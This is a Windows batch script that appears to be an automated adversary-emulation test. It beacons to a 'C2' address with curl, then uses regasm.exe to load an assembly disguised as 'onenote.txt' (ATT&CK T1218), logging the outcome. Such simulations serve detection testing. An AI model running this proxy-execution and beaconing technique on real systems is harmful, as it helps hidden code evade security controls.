@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET pjkcpgw=%APPDATA%\8515\58fb8179
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?8515-7
SET hlbnp=ITZEL-S2B
SET pudaazx=7
SET syjfr=onenote.txt
SET ewjmdkff=8515

SET zxlfd=%APPDATA%\!pudaazx!\macula-simulations.log
SET qwsnt=regasm.exe
SET hjtfe=T1218
SET ybnjm=Signed Binary Proxy Execution

REM Log script start
echo [%DATE% %TIME%][DEBUG][!hlbnp!]: script_start>> "!zxlfd!" 2>nul

REM 1. C2 HEARTBEAT
echo [%DATE% %TIME%][DEBUG][!hlbnp!]: heartbeat_start>> "!zxlfd!" 2>nul
curl -k -s -o nul "!drguvr!"
echo [%DATE% %TIME%][DEBUG][!hlbnp!]: heartbeat_complete>> "!zxlfd!" 2>nul

REM 2. Change to output directory
echo [%DATE% %TIME%][DEBUG][!hlbnp!]: chdir_start>> "!zxlfd!" 2>nul
cd /d "!pjkcpgw!"
SET ftrew=!ERRORLEVEL!
echo [%DATE% %TIME%][DEBUG][!hlbnp!]: chdir_result=!ftrew!>> "!zxlfd!" 2>nul

REM 3. Execute DLL via regasm.exe
echo [%DATE% %TIME%][DEBUG][!hlbnp!]: regasm_exec_start>> "!zxlfd!" 2>nul
SET vncxm=1
SET yhnbg=
!qwsnt! /U "!syjfr!"
IF NOT !ERRORLEVEL! EQU 0 (
    SET vncxm=0
    SET yhnbg=assembly_load_failed
)
echo [%DATE% %TIME%][DEBUG][!hlbnp!]: regasm_exec_complete>> "!zxlfd!" 2>nul

REM TTP logging
SET dqswq=!pudaazx!-!ewjmdkff!-!hjtfe!|!ybnjm!=!vncxm!:!yhnbg!
echo [%DATE% %TIME%][!hlbnp!]: !dqswq!>> "!zxlfd!" 2>nul
echo [%DATE% %TIME%][DEBUG][!hlbnp!]: ttp_logged>> "!zxlfd!" 2>nul